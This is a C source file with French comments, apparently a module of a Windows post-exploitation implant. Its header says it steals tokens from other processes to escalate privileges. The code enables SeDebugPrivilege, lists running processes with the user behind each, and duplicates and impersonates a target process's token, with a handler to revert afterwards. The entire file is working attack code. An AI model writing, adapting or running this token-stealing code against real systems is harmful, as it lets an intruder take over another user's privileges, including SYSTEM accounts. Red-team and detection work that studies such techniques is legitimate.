/*
 * token.c - Manipulation de tokens
 *
 * Permet de voler des tokens d'autres processus pour
 * l'élévation de privilèges.
 */

#include "token.h"
#include "../../utils/memory.h"
#include "../../utils/strings.h"
#include <tlhelp32.h>

/* Token original (avant le steal) */
static HANDLE g_original_token = NULL;
static bool g_token_stolen = false;

/*
 * Active un privilège pour le token courant.
 */
static bool enable_privilege(const char *privilege_name) {
  HANDLE token;
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
    return false;
  }

  LUID luid;
  if (!LookupPrivilegeValueA(NULL, privilege_name, &luid)) {
    CloseHandle(token);
    return false;
  }

  TOKEN_PRIVILEGES tp;
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  BOOL success =
      AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
  DWORD error = GetLastError();

  CloseHandle(token);

  return success && error == ERROR_SUCCESS;
}

int handler_token_list(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  /* Active SeDebugPrivilege pour pouvoir ouvrir les autres process */
  enable_privilege("SeDebugPrivilege");

  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE) {
    *output = str_dup("Failed to create snapshot");
    *len = *output ? strlen(*output) : 0;
    return STATUS_FAILURE;
  }

  PROCESSENTRY32 entry;
  entry.dwSize = sizeof(PROCESSENTRY32);

  /* Buffer pour la liste */
  char *buffer = NULL;
  size_t buffer_size = 0;
  size_t buffer_used = 0;

  /* Header */
  const char *header = "PID       USER                          PROCESS\n";
  size_t header_len = strlen(header);
  buffer = (char *)malloc(8192);
  if (!buffer) {
    CloseHandle(snapshot);
    return STATUS_NO_MEMORY;
  }
  buffer_size = 8192;
  memcpy(buffer, header, header_len);
  buffer_used = header_len;

  if (Process32First(snapshot, &entry)) {
    do {
      /* Essaie d'ouvrir le process */
      HANDLE proc =
          OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);
      if (!proc) {
        continue;
      }

      /* Récupère le token */
      HANDLE token;
      if (!OpenProcessToken(proc, TOKEN_QUERY, &token)) {
        CloseHandle(proc);
        continue;
      }

      /* Récupère l'utilisateur du token */
      char user_name[128] = "UNKNOWN";
      char domain_name[128] = "";

      DWORD token_info_len = 0;
      GetTokenInformation(token, TokenUser, NULL, 0, &token_info_len);

      if (token_info_len > 0) {
        TOKEN_USER *token_user = (TOKEN_USER *)malloc(token_info_len);
        if (token_user) {
          if (GetTokenInformation(token, TokenUser, token_user, token_info_len,
                                  &token_info_len)) {
            char name[128], domain[128];
            DWORD name_len = sizeof(name);
            DWORD domain_len = sizeof(domain);
            SID_NAME_USE sid_type;

            if (LookupAccountSidA(NULL, token_user->User.Sid, name, &name_len,
                                  domain, &domain_len, &sid_type)) {
              strncpy(user_name, name, sizeof(user_name) - 1);
              strncpy(domain_name, domain, sizeof(domain_name) - 1);
            }
          }
          free(token_user);
        }
      }

      CloseHandle(token);
      CloseHandle(proc);

      /* Ajoute la ligne */
      char line[512];
      snprintf(line, sizeof(line), "%-9lu %-30s %s\n", entry.th32ProcessID,
               user_name, entry.szExeFile);

      size_t line_len = strlen(line);

      if (buffer_used + line_len + 1 > buffer_size) {
        buffer_size *= 2;
        char *new_buffer = (char *)realloc(buffer, buffer_size);
        if (!new_buffer) {
          free(buffer);
          CloseHandle(snapshot);
          return STATUS_NO_MEMORY;
        }
        buffer = new_buffer;
      }

      memcpy(buffer + buffer_used, line, line_len);
      buffer_used += line_len;

    } while (Process32Next(snapshot, &entry));
  }

  CloseHandle(snapshot);

  buffer[buffer_used] = '\0';
  *output = buffer;
  *len = buffer_used;

  return STATUS_SUCCESS;
}

int handler_token_steal(DWORD pid) {
  if (pid == 0) {
    return STATUS_FAILURE;
  }

  /* Active SeDebugPrivilege */
  if (!enable_privilege("SeDebugPrivilege")) {
    return STATUS_FAILURE;
  }

  /* Ouvre le process cible */
  HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (!proc) {
    return STATUS_FAILURE;
  }

  /* Récupère son token */
  HANDLE token;
  if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
    CloseHandle(proc);
    return STATUS_FAILURE;
  }

  /* Duplique le token */
  HANDLE dup_token;
  BOOL success =
      DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                       TokenImpersonation, &dup_token);

  CloseHandle(token);
  CloseHandle(proc);

  if (!success) {
    return STATUS_FAILURE;
  }

  /* Impersonate */
  if (!ImpersonateLoggedOnUser(dup_token)) {
    CloseHandle(dup_token);
    return STATUS_FAILURE;
  }

  /* Sauvegarde le token pour pouvoir revert */
  if (g_original_token) {
    CloseHandle(g_original_token);
  }
  g_original_token = dup_token;
  g_token_stolen = true;

  return STATUS_SUCCESS;
}

int handler_token_revert(void) {
  if (!g_token_stolen) {
    return STATUS_SUCCESS; /* Rien à faire */
  }

  RevertToSelf();

  if (g_original_token) {
    CloseHandle(g_original_token);
    g_original_token = NULL;
  }

  g_token_stolen = false;

  return STATUS_SUCCESS;
}
